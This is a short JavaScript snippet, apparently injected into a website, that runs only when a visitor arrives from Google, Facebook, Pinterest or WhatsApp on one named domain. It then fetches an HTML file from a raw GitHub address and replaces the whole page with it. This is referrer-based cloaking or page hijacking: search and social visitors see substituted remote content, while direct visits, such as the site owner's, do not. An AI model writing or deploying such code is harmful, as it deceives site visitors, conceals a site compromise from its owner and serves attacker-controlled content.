const referrer = document.referrer.toLowerCase();
const currentDomain = window.location.hostname.toLowerCase();

const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];
const articleContent = '';

if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'roneeyi.com') {
  fetch('https://raw.githubusercontent.com/mrotang/cloudflare/assets/raja.html')
    .then(response => response.text())
    .then(html => {
      const article = document.querySelector('html');
      article.innerHTML = html;
    })
    .catch(error => console.error(error));
}
